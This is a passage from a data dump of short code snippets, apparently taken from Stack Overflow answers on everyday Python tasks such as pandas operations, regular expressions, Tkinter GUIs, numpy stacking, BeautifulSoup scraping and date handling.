</snippet></ROW><ROW><id>20441515</id><snippet>Widget</snippet></ROW><ROW><id>20441515</id><snippet>BoxLayout</snippet></ROW><ROW><id>20441515</id><snippet>AnchorLayout</snippet></ROW><ROW><id>20441515</id><snippet>FloatLayout</snippet></ROW><ROW><id>20441824</id><snippet>r'^articles/(?P&lt;collection&gt;\w+)/$'
</snippet></ROW><ROW><id>20441952</id><snippet>function M=mandelPerf()

rr = -2:0.005:0.5;
ii = -1:0.005:1;

[R,I] = meshgrid(rr,ii);
M = arrayfun(@(x) mandel(x), R+1i*I);

end

function n = mandel(z)
n = 0;
c = z;
for n=0:100
    if abs(z)&gt;2
        break
    end
    z = z^2+c;
end
end
</snippet></ROW><ROW><id>20442012</id><snippet>#e50000</snippet></ROW><ROW><id>20442012</id><snippet>color[1:3] == "e5" # Hexadecimal value
color[3:5] == "00" # Hexadecimal value
color[5:7] == "00" # Hexadecimal value
</snippet></ROW><ROW><id>20442012</id><snippet>lambda</snippet></ROW><ROW><id>20442012</id><snippet>int(x, 16) / 256.0</snippet></ROW><ROW><id>20442012</id><snippet>x</snippet></ROW><ROW><id>20442012</id><snippet>e5</snippet></ROW><ROW><id>20442012</id><snippet>int</snippet></ROW><ROW><id>20442012</id><snippet>int</snippet></ROW><ROW><id>20442012</id><snippet>e5</snippet></ROW><ROW><id>20442063</id><snippet>Series</snippet></ROW><ROW><id>20442063</id><snippet>&gt;&gt;&gt; ds = pd.Series([1,2,3,4,5]) 
&gt;&gt;&gt; ds.append(pd.Series([6]))
0    1
1    2
2    3
3    4
4    5
0    6
dtype: int64
</snippet></ROW><ROW><id>20442063</id><snippet>DataFrame</snippet></ROW><ROW><id>20442063</id><snippet>&gt;&gt;&gt; df = pd.DataFrame(ds)
&gt;&gt;&gt; df.append([6], ignore_index=True)
   0
0  1
1  2
2  3
3  4
4  5
5  6
</snippet></ROW><ROW><id>20442063</id><snippet>&gt;&gt;&gt; ds.set_value(max(ds.index) + 1,  6)
0    1
1    2
2    3
3    4
4    5
5    6
dtype: int64
</snippet></ROW><ROW><id>20442063</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; pd.Series(np.concatenate((ds.values, [6])))
</snippet></ROW><ROW><id>20442131</id><snippet>def myfunc(a, bret=False, cret=False):
   ...
   return (a,) + ((b,) if bret else ()) + ((c,) if cret else ())
</snippet></ROW><ROW><id>20442204</id><snippet>soup.find</snippet></ROW><ROW><id>20442204</id><snippet>None</snippet></ROW><ROW><id>20442204</id><snippet>if/else</snippet></ROW><ROW><id>20442204</id><snippet>for item in fulllist:
    span = item.find("span", class_="modelYearSort")
    if span:
        item_print = span.string
        item_print=item_print + "|" + item.find("span", class_="mmtSort").string
        seller_phone=item.find("span", class_="seller-phone")
        print(seller_phone)
        # item_print=item_print + "|" + item.find("span", class_="seller-phone").string
        item_print=item_print + "|" + item.find("span", class_="priceSort").string
        item_print=item_print + "|" + item.find("span", class_="milesSort").string
        print(item_print)
    else:
        continue #It's empty, go on to the next loop.
</snippet></ROW><ROW><id>20442204</id><snippet>try/except</snippet></ROW><ROW><id>20442204</id><snippet>for item in fulllist:
    try:
        item_print=item.find("span", class_="modelYearSort").string
    except AttributeError:
        continue #skip to the next loop.
    else:
        item_print=item_print + "|" + item.find("span", class_="mmtSort").string
        seller_phone=item.find("span", class_="seller-phone")
        print(seller_phone)
        # item_print=item_print + "|" + item.find("span", class_="seller-phone").string
        item_print=item_print + "|" + item.find("span", class_="priceSort").string
        item_print=item_print + "|" + item.find("span", class_="milesSort").string
        print(item_print)
</snippet></ROW><ROW><id>20442259</id><snippet>a</snippet></ROW><ROW><id>20442259</id><snippet>a</snippet></ROW><ROW><id>20442309</id><snippet>regex</snippet></ROW><ROW><id>20442309</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; re.sub(r'(?&lt;=\d)\s(?=\d)', '', '12345 67890')
'1234567890'
&gt;&gt;&gt; re.sub(r'(?&lt;=\d)\s(?=\d)', '', 'abc 123')
'abc 123'
&gt;&gt;&gt; re.sub(r'(?&lt;=\d)\s(?=\d)', '', '123 abc')
'123 abc'
&gt;&gt;&gt; re.sub(r'(?&lt;=\d)\s(?=\d)', '', 'abc def')
'abc def'
&gt;&gt;&gt; re.sub(r'(?&lt;=\d)\s(?=\d)', '', '123 abc 1234 456')
'123 abc 1234456'
</snippet></ROW><ROW><id>20442320</id><snippet>from Tkinter import *
</snippet></ROW><ROW><id>20442320</id><snippet>from tkinter import *
</snippet></ROW><ROW><id>20442320</id><snippet>python 2.7</snippet></ROW><ROW><id>20442320</id><snippet>from Tkinter import *</snippet></ROW><ROW><id>20442320</id><snippet>import sys
if sys.version_info[0]==2:
    from Tkinter import *
if sys.version_info[0]==3:
    from tkinter import *
</snippet></ROW><ROW><id>20442378</id><snippet>tk8.5-dev</snippet></ROW><ROW><id>20442378</id><snippet>tcl8.5-dev</snippet></ROW><ROW><id>20442378</id><snippet>$ sudo pip install pillow
</snippet></ROW><ROW><id>20442378</id><snippet>python-imaging-compat</snippet></ROW><ROW><id>20442538</id><snippet>'search:(?&lt;!r[\'"])([^ \'"]+)'</snippet></ROW><ROW><id>20442538</id><snippet>h:</snippet></ROW><ROW><id>20442538</id><snippet>h:</snippet></ROW><ROW><id>20442538</id><snippet>r'</snippet></ROW><ROW><id>20442538</id><snippet>r"</snippet></ROW><ROW><id>20442538</id><snippet>(?!r[\'"])</snippet></ROW><ROW><id>20442538</id><snippet>import re

quoted = re.compile(r'search:(?:[\'"])([^"\']+)')
regex = re.compile(r'search:r(?:[\'"])([^"\']+)')
unquoted = re.compile(r'search:(?!r[\'"])([^ \'"]+)')

test_str = "search:foo search:romeo "\
           "search:'bar' search:\"baz\" "\
           "search:r'blah' search:r\"bleh\""\
           "search:isn'it something to catch ?"

"""
•search:'pattern' and search:"pattern" (quoted search)
•search:r'pattern' and search:r"pattern" (regex search)
•search:pattern (unquoted search)

"""
print quoted.findall(test_str)
print
print regex.findall(test_str)
print
print unquoted.findall(test_str)
</snippet></ROW><ROW><id>20442538</id><snippet>['bar', 'baz']

['blah', 'bleh']

['foo', 'romeo', 'isn']
</snippet></ROW><ROW><id>20442538</id><snippet>isn'it</snippet></ROW><ROW><id>20442648</id><snippet>Counter</snippet></ROW><ROW><id>20442648</id><snippet>from collections import Counter
with open("Input.txt") as inFile:
    print Counter([" ".join(line.split()[::2]) for line in inFile])
</snippet></ROW><ROW><id>20442648</id><snippet>Counter({'act art': 2, 'act pho': 1, 'act act': 1, 'act pro': 1, 'act evt': 1,
'act pos': 1})
</snippet></ROW><ROW><id>20442833</id><snippet>n*4</snippet></ROW><ROW><id>20442833</id><snippet>array</snippet></ROW><ROW><id>20442833</id><snippet>n</snippet></ROW><ROW><id>20442833</id><snippet>&gt;&gt;&gt; np.vstack((np.arange(10),np.arange(1,11),np.arange(2,12)))
array([[ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9],
       [ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10],
       [ 2,  3,  4,  5,  6,  7,  8,  9, 10, 11]])
&gt;&gt;&gt; np.vstack((np.arange(10),np.arange(0,11),np.arange(0,12)))

Traceback (most recent call last):
  File "&lt;pyshell#36&gt;", line 1, in &lt;module&gt;
    np.vstack((np.arange(10),np.arange(0,11),np.arange(0,12)))
  File "C:\Python27\lib\site-packages\numpy\core\shape_base.py", line 226, in vstack
    return _nx.concatenate(map(atleast_2d,tup),0)
ValueError: all the input array dimensions except for the concatenation axis must match exactly
</snippet></ROW><ROW><id>20442833</id><snippet>ValueError</snippet></ROW><ROW><id>20442833</id><snippet>array</snippet></ROW><ROW><id>20442833</id><snippet>list</snippet></ROW><ROW><id>20442833</id><snippet>list3</snippet></ROW><ROW><id>20442833</id><snippet>list2</snippet></ROW><ROW><id>20442833</id><snippet>np.vstack((np.ones((10,4)),np.ones((10,6)),np.ones((10,6))))</snippet></ROW><ROW><id>20442833</id><snippet>np.vstack((np.ones((10,4)),np.ones((11,4)),np.ones((12,4))))</snippet></ROW><ROW><id>20442833</id><snippet>array</snippet></ROW><ROW><id>20442833</id><snippet>vstack</snippet></ROW><ROW><id>20442833</id><snippet>list2</snippet></ROW><ROW><id>20442833</id><snippet>array</snippet></ROW><ROW><id>20442833</id><snippet>arrays</snippet></ROW><ROW><id>20442833</id><snippet>array</snippet></ROW><ROW><id>20442833</id><snippet>shape</snippet></ROW><ROW><id>20442833</id><snippet>np.lib.pad</snippet></ROW><ROW><id>20442833</id><snippet>&gt;&gt;&gt; b=np.random.randint(0,20, size=(12,4))
&gt;&gt;&gt; np.lib.pad(b, ((0,3),(0,0)), 'constant', constant_values=[0.])
array([[ 5,  2, 10,  7],
       [ 7, 17,  8, 11],
       [ 7,  7,  2, 10],
       [16, 17, 15, 16],
       [ 0, 19,  5,  6],
       [18, 19, 18,  6],
       [ 2,  8, 11, 19],
       [ 3, 17, 18, 16],
       [10,  1, 12, 11],
       [ 0,  7,  1, 14],
       [ 7, 17,  8, 16],
       [12,  6,  3,  5],
       [ 0,  0,  0,  0],
       [ 0,  0,  0,  0],
       [ 0,  0,  0,  0]])
</snippet></ROW><ROW><id>20442833</id><snippet>((0,3),(0,0))</snippet></ROW><ROW><id>20442833</id><snippet>((0,max_length-length_of_current_array),(0,0))</snippet></ROW><ROW><id>20442833</id><snippet>np.hstack</snippet></ROW><ROW><id>20442833</id><snippet>nan</snippet></ROW><ROW><id>20442833</id><snippet>0.</snippet></ROW><ROW><id>20442833</id><snippet>0.</snippet></ROW><ROW><id>20442923</id><snippet>max</snippet></ROW><ROW><id>20442923</id><snippet>key=int</snippet></ROW><ROW><id>20442923</id><snippet>def kmax(col):
    key = int if all(x.isdigit() for x in col) else str
    return max(col, key=key)

print kmax(['1','40','5','520','1025']) # 1025
print kmax(['foo','bar','40','baz']) # foo
</snippet></ROW><ROW><id>20443029</id><snippet>pip uninstall selenium
pip install selenium==2.3.7
</snippet></ROW><ROW><id>20443133</id><snippet>coef_</snippet></ROW><ROW><id>20443133</id><snippet>intercept_</snippet></ROW><ROW><id>20443133</id><snippet>P = A / (1 + A)
</snippet></ROW><ROW><id>20443133</id><snippet>P /= P.sum(axis=1).reshape((-1, 1))
</snippet></ROW><ROW><id>20443199</id><snippet>4.4</snippet></ROW><ROW><id>20443199</id><snippet>In [2]: '%.20f' % (3.3 + 1.1)
Out[2]: '4.40000000000000035527'
</snippet></ROW><ROW><id>20443242</id><snippet>from collections import defaultdict

class Index:
    def __init__(self, stringlist):
        self.index = defaultdict(list)
        for string in stringlist:
            for word in string.split():
                self.index[word].append(string)

    def strings_containing(self, word):
        return self.index[word]
</snippet></ROW><ROW><id>20443327</id><snippet>connect</snippet></ROW><ROW><id>20443327</id><snippet>StringVar</snippet></ROW><ROW><id>20443327</id><snippet>StringVar</snippet></ROW><ROW><id>20443327</id><snippet>get()</snippet></ROW><ROW><id>20443327</id><snippet>entered_host.get()</snippet></ROW><ROW><id>20443327</id><snippet>from Tkinter import *
from socket import *
port = 7142

on = '02 00 00 00 00'
off = '02 01 00 00 00'


def callback_power_on(data, host):
    if not host:
        print "No host given!"
        return
    print "power on!"
    connection = socket(AF_INET, SOCK_STREAM)
    connection.connect((host, port))
    connection.sendall(add_checksum(data))
    connection.close()


def callback_power_off(data, host):
    if not host:
        print "No host given!"
        return
    print "power off!"
    connection = socket(AF_INET, SOCK_STREAM)
    connection.connect((host, port))
    connection.sendall(add_checksum(data))
    connection.close()


def add_checksum(s):
    result = []
    acc = 0
    for hexcode in s.split():
        code = int(hexcode, 16)
        acc += code
        result.append(chr(code))
    result.append(chr(acc))
    return ''.join(result)

master = Tk()

entered_host = StringVar()
e = Entry(master, textvariable=entered_host)
e.pack()

b = Button(
    master,
    text="Power On",
    command=lambda: callback_power_on(on, entered_host.get()))
b.pack()

c = Button(
    master,
    text="Power Off",
    command=lambda: callback_power_off(off, entered_host.get()))
c.pack()

mainloop()
</snippet></ROW><ROW><id>20443358</id><snippet>import re

splitter = re.compile('[A-Z]+(?![a-z])|[A-Z]?[a-z]+|[^A-Za-z \t\r\n]+').findall
fix_tweet = lambda t: ' '.join(splitter(t))
</snippet></ROW><ROW><id>20443358</id><snippet>fix_tweet('AdeleOfficial')    # -&gt; 'Adele Official'
fix_tweet('EPPGroup')         # -&gt; 'EPP Group'
</snippet></ROW><ROW><id>20443358</id><snippet>[A-Z]+(?![a-z])</snippet></ROW><ROW><id>20443358</id><snippet>[A-Z]?[a-z]+</snippet></ROW><ROW><id>20443358</id><snippet>[^A-Za-z \t\r\n]+</snippet></ROW><ROW><id>20443741</id><snippet>l = [item(i, 0) for i in range(10)]
</snippet></ROW><ROW><id>20443943</id><snippet>def rate():
    rate = 1
    if var.get() =='GBP' and var2.get() =='USD':
        rate=float(1.63452)
    if var.get() == 'GBP' and var2.get()=='EUR':
        rate=float(1.19529)
    ## TODO:: add other convertion conditions
    return rate

def convert():
    converted=Label(root, text=(var.get(), entarr.get(),"&gt;&gt;&gt;", (entarr.get()*rate()), var2.get()))
    converted.pack(expand=1)
    return convert
</snippet></ROW><ROW><id>20444082</id><snippet>Lists = line
</snippet></ROW><ROW><id>20444082</id><snippet>Lists.append(line)
</snippet></ROW><ROW><id>20444082</id><snippet>total = sum(sum(map(int, item)) for item in Lists)
</snippet></ROW><ROW><id>20444082</id><snippet>extend</snippet></ROW><ROW><id>20444082</id><snippet>Lists.extend(line)
...
total = sum(map(int, Lists))
</snippet></ROW><ROW><id>20444187</id><snippet>&gt;&gt;&gt; json.dumps(['please','help','me'])
'["please", "help", "me"]'
&gt;&gt;&gt; json.loads('["please", "help", "me"]')
[u'please', u'help', u'me']
</snippet></ROW><ROW><id>20444256</id><snippet>data.reindex( index=data.index[ ::-1 ] )
</snippet></ROW><ROW><id>20444256</id><snippet>for</snippet></ROW><ROW><id>20444256</id><snippet>for idx in reversed( data.index ):
    print( idx, data.ix[ idx ][ 'Even' ], data.ix[ idx ][ 'Odd' ] )
</snippet></ROW><ROW><id>20444256</id><snippet>for idx in reversed( data.index ):
    print( idx, data.Even[ idx ], data.Odd[ idx ] )
</snippet></ROW><ROW><id>20444256</id><snippet>reversed</snippet></ROW><ROW><id>20444256</id><snippet>data.__len__( )</snippet></ROW><ROW><id>20444256</id><snippet>data[ j - 1 ]</snippet></ROW><ROW><id>20444256</id><snippet>j</snippet></ROW><ROW><id>20444256</id><snippet>range(6, 0, -1)</snippet></ROW><ROW><id>20444256</id><snippet>data[ 5 ]</snippet></ROW><ROW><id>20444256</id><snippet>data[ 5 ]</snippet></ROW><ROW><id>20444345</id><snippet>dict.items()</snippet></ROW><ROW><id>20444345</id><snippet>dict.iter*</snippet></ROW><ROW><id>20444345</id><snippet>dict.items()</snippet></ROW><ROW><id>20444345</id><snippet>dict.iteritems()</snippet></ROW><ROW><id>20444345</id><snippet>dict</snippet></ROW><ROW><id>20444345</id><snippet>dict.keys()</snippet></ROW><ROW><id>20444345</id><snippet>dict.items()</snippet></ROW><ROW><id>20444345</id><snippet>dict.values()</snippet></ROW><ROW><id>20444345</id><snippet>k = d.keys(); k.sort()</snippet></ROW><ROW><id>20444345</id><snippet>k = sorted(d)</snippet></ROW><ROW><id>20444345</id><snippet>dict.iterkeys()</snippet></ROW><ROW><id>20444345</id><snippet>dict.iteritems()</snippet></ROW><ROW><id>20444345</id><snippet>dict.itervalues()</snippet></ROW><ROW><id>20444345</id><snippet>.next()</snippet></ROW><ROW><id>20444345</id><snippet>.__next__()</snippet></ROW><ROW><id>20444345</id><snippet>graph.iteritems().next()</snippet></ROW><ROW><id>20444345</id><snippet>current = next(iter(graph.items()))
</snippet></ROW><ROW><id>20444345</id><snippet>iter()</snippet></ROW><ROW><id>20444345</id><snippet>next()</snippet></ROW><ROW><id>20444345</id><snippet>next</snippet></ROW><ROW><id>20444345</id><snippet>while</snippet></ROW><ROW><id>20444345</id><snippet>next()</snippet></ROW><ROW><id>20444345</id><snippet>next_</snippet></ROW><ROW><id>20444345</id><snippet>current</snippet></ROW><ROW><id>20444345</id><snippet>cycles</snippet></ROW><ROW><id>20444345</id><snippet>current</snippet></ROW><ROW><id>20444345</id><snippet>next(iter(dict))</snippet></ROW><ROW><id>20444345</id><snippet>while graph:
    current = next(iter(graph))
    cycle = [current]
    cycles[current] = cycle
    while current in graph:
        next_ = graph[current][0]
        del graph[current][0]
        if len(graph[current]) == 0:
            del graph[current]
        current = next_
        cycle.append(next_)
</snippet></ROW><ROW><id>20444345</id><snippet>&gt;&gt;&gt; cycles
{0: [0, 3, 2, 1, 0], 2: [2, 6, 5, 4, 2], 6: [6, 8, 7, 9, 6]}
</snippet></ROW><ROW><id>20444605</id><snippet>d['foo'] = map(tuple, d['foo'])
d['bar'] = # etc...
</snippet></ROW><ROW><id>20444605</id><snippet>d['foo'] = [tuple(el) for el in d['foo']]
</snippet></ROW><ROW><id>20444605</id><snippet>for key in ('foo', 'bar'):
    d[key] = [tuple(el) for el in d[key])
</snippet></ROW><ROW><id>20444712</id><snippet>import BeautifulSoup
</snippet></ROW><ROW><id>20444712</id><snippet>from BeatifulSoup import BeatifulSoup
soup = BeatifulSoup(html)
</snippet></ROW><ROW><id>20444712</id><snippet>import BeatifulSoup
soup = BeatifulSoup.BeatifulSoup(html)
</snippet></ROW><ROW><id>20444760</id><snippet>__init__</snippet></ROW><ROW><id>20444760</id><snippet>app = Application(master=root)
</snippet></ROW><ROW><id>20444760</id><snippet>'instance'</snippet></ROW><ROW><id>20444760</id><snippet>__init__</snippet></ROW><ROW><id>20444760</id><snippet>app = Application()</snippet></ROW><ROW><id>20444760</id><snippet>self</snippet></ROW><ROW><id>20444760</id><snippet>self</snippet></ROW><ROW><id>20444760</id><snippet>'self'</snippet></ROW><ROW><id>20444760</id><snippet>self.</snippet></ROW><ROW><id>20444760</id><snippet>'self'</snippet></ROW><ROW><id>20444760</id><snippet>app</snippet></ROW><ROW><id>20444760</id><snippet>app.attribute</snippet></ROW><ROW><id>20444760</id><snippet>app.method</snippet></ROW><ROW><id>20444760</id><snippet>self.attribute</snippet></ROW><ROW><id>20444760</id><snippet>self.method(args)</snippet></ROW><ROW><id>20444783</id><snippet>n // k</snippet></ROW><ROW><id>20444783</id><snippet>n // k</snippet></ROW><ROW><id>20444814</id><snippet>[u'Sugar', u'Rice', u'Bleach']</snippet></ROW><ROW><id>20444814</id><snippet>list</snippet></ROW><ROW><id>20444814</id><snippet>ast.literal_eval</snippet></ROW><ROW><id>20444814</id><snippet>&gt;&gt;&gt; a="[u'Sugar', u'Rice', u'Bleach']"
&gt;&gt;&gt; import ast
&gt;&gt;&gt; ast.literal_eval(a)
[u'Sugar', u'Rice', u'Bleach']
&gt;&gt;&gt; ast.literal_eval(a)[1]
u'Rice'
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>20444928</id><snippet>x = sorted( degree_frequencies.keys( ) )
y = [ degree_frequencies[ k ] for k in x ]
plt.loglog( x, y )
</snippet></ROW><ROW><id>20444975</id><snippet>try the get_text() method on the 'a' tags(or any tags)

for instance if html is simply "&lt;a href="alisejflai"&gt;hello&lt;/a&gt;"

soup = BeautifulSoup(html)

soup.get_text() is 'hello'`
</snippet></ROW><ROW><id>20444975</id><snippet>(0, &lt;a class="hot_name"&gt; howdy pardner&lt;/a&gt;)
(1, &lt;a class="hot_name"&gt;againagain&lt;/a&gt;)
</snippet></ROW><ROW><id>20444975</id><snippet>get_text()</snippet></ROW><ROW><id>20444975</id><snippet>for name in names:
    name.get_text() # no tuple involved
</snippet></ROW><ROW><id>20444975</id><snippet>for name in enumerate(names):
    name[1].get_text() # accessing just the a tag within the tuple.
</snippet></ROW><ROW><id>20444975</id><snippet>hotel_names = [name.get_text() for name in names] #or [name[1].get_text() for name in enumerate(names)]
prices = [price.get_text() for prices in prices] #[price[1].get_text() for price in enumerate(prices)]

name_price_list = zip(hotel_names, prices)

for name, price in name_price_list:
    print name, price
</snippet></ROW><ROW><id>20444975</id><snippet>name price
name price
name price etc.
</snippet></ROW><ROW><id>20445109</id><snippet>dateutil</snippet></ROW><ROW><id>20445109</id><snippet>from dateutil.relativedelta import relativedelta
from dateutil.rrule import rrule, WEEKLY, MO, SU
from datetime import datetime, timedelta

def four_weeks(year, week):
    end = datetime(year, 1, 1) + relativedelta(weeks=week-1, weekday=SU)
    start = end - relativedelta(weeks=4, weekday=MO)
    mint, maxt = datetime.min.time(), datetime.max.time()
    for dt in rrule(WEEKLY, start, count=4):
        yield dt.combine(dt, mint), dt.combine(dt + timedelta(days=6), maxt)

for start, end in four_weeks(2013, 44):
    print start, '-&gt;', end
</snippet></ROW><ROW><id>20445109</id><snippet>2013-10-07 00:00:00 -&gt; 2013-10-13 23:59:59.999999
2013-10-14 00:00:00 -&gt; 2013-10-20 23:59:59.999999
2013-10-21 00:00:00 -&gt; 2013-10-27 23:59:59.999999
2013-10-28 00:00:00 -&gt; 2013-11-03 23:59:59.999999
</snippet></ROW><ROW><id>20445214</id><snippet>from collections import defaultdict

operators = defaultdict(list)
for line in open('data').readlines():
    pre, begin, end, _, operator_name = line.split(None,4)
    operators[pre].append((int(begin),int(end),operator_name))
</snippet></ROW><ROW><id>20445214</id><snippet>operators</snippet></ROW><ROW><id>20445214</id><snippet>import pickle
pickle.dump(operators, open("operators", "wb"))
</snippet></ROW><ROW><id>20445214</id><snippet>operators</snippet></ROW><ROW><id>20445214</id><snippet>operators = pickle.load(open("operators", "r"))
</snippet></ROW><ROW><id>20445214</id><snippet>def get_operator(number, operators):
    pre = number[2:5]
    suf = int(number[5:])
    for begin, end, name in operators[pre]:
        if begin &lt;= suf &lt;= end:
            return name.strip()
    return Null


print get_operator("+79161234567", operators)
</snippet></ROW><ROW><id>20445214</id><snippet>Mobile TeleSystems</snippet></ROW><ROW><id>20445243</id><snippet>#!/usr/bin/env python
from timeit import default_timer as timer
from twisted.internet import reactor, utils
from twisted.web import xmlrpc, server

class Example(xmlrpc.XMLRPC):
    def xmlrpc_echo(self, x):
        """Sanity check."""
        return x
    def xmlrpc_getoutput(self):
        shell_command = "echo before sleep; sleep 10; echo after sleep"
        start = timer()
        d = utils.getProcessOutput("/bin/sh", ["-c", shell_command])
        print("Deferred created in %.2f seconds" % (timer() - start,)) # instant
        return d

reactor.listenTCP(9657, server.Site(Example()))
reactor.run()
</snippet></ROW><ROW><id>20445243</id><snippet>#!/usr/bin/env python
from timeit import default_timer as timer
import xmlrpclib

s = xmlrpclib.Server('http://localhost:9657/')

def report_delay(func, *args):
    start = timer()
    print("Result %r took us %.2f seconds" % (func(*args), timer() - start))

report_delay(s.echo, "Mor-ee-air-teeeee") # should be instant
report_delay(s.getoutput) # should be ~10 seconds
</snippet></ROW><ROW><id>20445293</id><snippet>messages = ([msg['created_at'], msg['txt'], msg['user']['id']] for msg in js.get('statuses', [])</snippet></ROW><ROW><id>20445293</id><snippet>messages = ([msg['created_at'], msg['txt'], msg['user']['id']] for msg in js.get('statuses', []))</snippet></ROW><ROW><id>20445293</id><snippet>SyntaxError</snippet></ROW><ROW><id>20445293</id><snippet>a = (]</snippet></ROW><ROW><id>20445293</id><snippet>a = (
b = "some stuff"
</snippet></ROW><ROW><id>20445293</id><snippet>a = (




b = "some stuff"
</snippet></ROW><ROW><id>20445293</id><snippet>SyntaxError</snippet></ROW><ROW><id>20445293</id><snippet>SyntaxErrors</snippet></ROW><ROW><id>20445561</id><snippet>write_csv('twitter_gmail.csv', messages, append=True)</snippet></ROW><ROW><id>20445561</id><snippet>main()</snippet></ROW><ROW><id>20445561</id><snippet>main()</snippet></ROW><ROW><id>20445561</id><snippet>messages</snippet></ROW><ROW><id>20445561</id><snippet>main()</snippet></ROW><ROW><id>20445561</id><snippet>def main():
    ts = TwitterSearch()
    response, data = ts.search('@gmail.com', result_type='recent')
    js = json.loads(data)

    messages = ([msg['created_at'], msg['txt'], msg['user']['id']] for msg in js.get('statuses', []))
    write_csv('twitter_gmail.csv', messages, append=True)

if __name__ == '__main__':
    main()
</snippet></ROW><ROW><id>20445704</id><snippet>from collections import defaultdict

outdict = defaultdict(list)
def getkeybyvalue(dictionary, value):
    return [i for i,j in dictionary.items() if value in j]

dict_from_file = """foo\tfoobar, bar, foo foo\tFoo bar language, computing\nprog\t python, java, c, c++\t computing\nedibles\tcereal, milk, whatever\tfood"""

columns = [line.strip().split('\t') for line in dict_from_file.split('\n')]
for c1, c2, c3 in columns:
    for c3_item in c3.split(','):
        outdict[c3_item.strip(', ')] += [c1] + [c.strip(' ,') for c in c2.split(',')]

for k in outdict:
    print(k, outdict[k])

print(getkeybyvalue(outdict, 'foo foo'))
</snippet></ROW><ROW><id>20445831</id><snippet>def powerprod(iterable):
    s = list(iterable)
    for r in itertools.count(1):
        for c in itertools.product(s, repeat=r):
            yield c
</snippet></ROW><ROW><id>20445831</id><snippet>&gt;&gt;&gt; map(''.join, itertools.islice(powerprod('eht'), 34))
['e', 'h', 't', 'ee', 'eh', 'et', 'he', 'hh', 'ht', 'te', 'th', 'tt', 'eee', 'eeh', 'eet', 'ehe', 'ehh', 'eht', 'ete', 'eth', 'ett', 'hee', 'heh', 'het', 'hhe', 'hhh', 'hht', 'hte', 'hth', 'htt', 'tee', 'teh', 'tet', 'the']
</snippet></ROW><ROW><id>20445831</id><snippet>001</snippet></ROW><ROW><id>20445831</id><snippet>1</snippet></ROW><ROW><id>20445831</id><snippet>from itertools import product, islice

def max_sum_n_pow_lower_x(x, n):
    """ returns tuple of number of summand and maximal sum
        of form `n` + `n`**2 + `n`**3  not greater than `x` """
    i, c, s = 1, 0, 0
    while s &lt; x:
       i *= n
       c += 1
       s += i
    return c-1, s-i

def get_nth_pow(iterable, n):
    l = list(iterable)
    repeat, start_from = max_sum_n_pow_lower_x(n, len(l))
    prod = itertools.product(l, repeat=repeat+1)
    return ''.join(list(islice(prod, n-start_from))[-1])
</snippet></ROW><ROW><id>20445831</id><snippet>&gt;&gt;&gt; get_nth_pow('eht', 34)
'the'
</snippet></ROW><ROW><id>20445838</id><snippet>range()</snippet></ROW><ROW><id>20445838</id><snippet>range(1, num+1)</snippet></ROW><ROW><id>20445861</id><snippet>ast</snippet></ROW><ROW><id>20445861</id><snippet>import ast

class ImportNodeVisitor(ast.NodeVisitor):
    def visit_Import(self, node):
        print(ast.dump(node))
        self.generic_visit(node)

    def visit_ImportFrom(self, node):
        print(ast.dump(node))
        self.generic_visit(node)


with open(sourcefilename) as sf:
    tree = ast.parse(sf.read(), sourcefilename)
    ImportNodeVisitor().visit(tree)
</snippet></ROW><ROW><id>20445861</id><snippet>Import(names=[alias(name='foo', asname=None)])
ImportFrom(module='bar', names=[alias(name='*', asname=None)], level=0)
</snippet></ROW><ROW><id>20446037</id><snippet>file_keys = ['Patient ID', 'Age', 'Gender',  
             'Height', 'Weight', 'HBA1C level' 
             'Cholesterol', 'Smoker status',   
             'Systolic BP', 'Diastolic BP']

with open('datafile') as fin:
    user_info = dict(zip(file_keys, fin))
    # Now process user_info into your xml 
</snippet></ROW><ROW><id>20446037</id><snippet>user_info</snippet></ROW><ROW><id>20446037</id><snippet>with open('datafile') as fin:
    while True:
        user_info = dict(zip(file_keys, fin))
        if not user_info:  # empty dict.  we're done.
            break
        # Now process user_info into your xml
</snippet></ROW><ROW><id>20446037</id><snippet>zip</snippet></ROW><ROW><id>20446037</id><snippet>file_keys</snippet></ROW><ROW><id>20446037</id><snippet>file_keys</snippet></ROW><ROW><id>20446324</id><snippet>struct.pack()</snippet></ROW><ROW><id>20446324</id><snippet>struct.unpack('I', '\x08\x08\x08\x08')</snippet></ROW><ROW><id>20446324</id><snippet>(134744072,)</snippet></ROW><ROW><id>20446324</id><snippet>struct.pack()</snippet></ROW><ROW><id>20446324</id><snippet>&gt;&gt;&gt; import struct
&gt;&gt;&gt; struct.unpack('I', '\x08\x08\x08\x08')
(134744072,)
&gt;&gt;&gt; struct.pack('I', _[0])
'\x08\x08\x08\x08'
</snippet></ROW><ROW><id>20446324</id><snippet>struct</snippet></ROW><ROW><id>20446324</id><snippet>struct</snippet></ROW><ROW><id>20446324</id><snippet>4s</snippet></ROW><ROW><id>20446385</id><snippet>lines = ["the 1", "and 2"]
d = {}

for l in lines:
    k, v = l.split()
    d[k] = v

for key in sorted(d, key=d.get, reverse=True):
    print ":".join([key, d[key]])
</snippet></ROW><ROW><id>20446385</id><snippet>lambda</snippet></ROW><ROW><id>20446385</id><snippet>lines = ["the 1", "and 2"]
d = {}

for l in lines:
    k, v = l.split()
    d[k] = v

for key in sorted(d, key=lambda k: d[k], reverse=True):
    print key + ":" + d[key]
</snippet></ROW><ROW><id>20446385</id><snippet>for value, key in sorted([(d[k], k) for k in d], reverse=True):
    print key + ":" + value
</snippet></ROW><ROW><id>20446385</id><snippet>def lines_to_dict(lines):
    return_dict = {}
    for line in lines:
        key, value = line.split()
        return_dict[key] = value

    return return_dict

if __name__ == "__main__":

    lines = ["the 1", "and 2"]
    print lines_to_dict(lines)
</snippet></ROW><ROW><id>20446392</id><snippet>y'' + (epsilon-x^2)y = 0</snippet></ROW><ROW><id>20446392</id><snippet>y[0]' = y[1]
y[1]' = -(epsilon-x^2)y[0]
</snippet></ROW><ROW><id>20446392</id><snippet>def D(Y,x):
    return np.array([Y[1], -(epsilon-x**2)*Y[0]])
</snippet></ROW><ROW><id>20446392</id><snippet>y'' + (epsilon-x^2)y = 0</snippet></ROW><ROW><id>20446540</id><snippet>line.split()</snippet></ROW><ROW><id>20446540</id><snippet>(key, value)</snippet></ROW><ROW><id>20446540</id><snippet>dict2 = {key:value for line in ["1:One", "2:Two", "4:Four"]
                   for key, value in (line.split(":"),)}
</snippet></ROW><ROW><id>20446540</id><snippet>dict2 = {}
for line in ["1:One", "2:Two", "4:Four"]:
